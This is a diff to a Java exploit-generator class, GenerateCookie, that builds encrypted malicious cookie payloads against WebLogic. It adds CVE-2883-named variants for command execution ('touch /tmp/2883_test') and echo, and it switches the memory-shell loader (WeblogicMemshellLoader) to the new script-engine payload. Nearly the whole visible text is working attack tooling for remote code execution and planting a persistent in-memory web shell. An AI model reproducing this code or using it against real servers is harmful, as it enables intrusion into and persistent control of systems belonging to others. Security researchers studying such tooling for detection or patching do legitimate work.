@@ -4,10 +4,8 @@ import com.feihong.encrypt.AESEncrypt;
 import com.feihong.encrypt.GCMEncrypt;
 import com.feihong.enumeration.EncryptMode;
 import com.feihong.enumeration.PayloadType;
-import com.feihong.payload.BasicCMDpayload;
-import com.feihong.payload.FileWritePayload;
-import com.feihong.payload.ScriptEnginePayload;
-import com.feihong.payload.TemplatesImplPayload;
+import com.feihong.payload.*;
+import com.feihong.template.BasicCmdTemplate;
 import com.feihong.template.WeblogicEcho;
 import com.feihong.template.WeblogicMemshellLoader;
 
@@ -23,7 +21,10 @@ public class GenerateCookie {
 
         switch(type){
             case Cmd:
-                payload = BasicCMDpayload.generate("calc");
+                payload = BasicCMDpayload.generate("/tmp/2555");
+                break;
+            case Cmd2883:
+                payload = BasicCMDpayload_2883.generate("touch /tmp/2883_test");
                 break;
             case FileOutputStreamTest:
                 payload = FileWritePayload.generate("poc.txt", "It works!");
@@ -34,8 +35,11 @@ public class GenerateCookie {
             case Echo:
                 payload = ScriptEnginePayload.generate(WeblogicEcho.class);
                 break;
+            case Echo2883:
+                payload = ScriptEnginePayload_2883.generate(WeblogicEcho.class);
+                break;
             case Memshell:
-                payload = ScriptEnginePayload.generate(WeblogicMemshellLoader.class);
+                payload = ScriptEnginePayload_2883.generate(WeblogicMemshellLoader.class);
                 break;
             default:
                 throw new RuntimeException("Not Supported Payload Type");
@@ -48,7 +52,7 @@ public class GenerateCookie {
                 break;
             case GCM:
                 cookie = GCMEncrypt.encrypt(key, payload);
-                break;
+                    break;
             default:
                 throw new RuntimeException("Not Supperted Encrypt Mode");
         }
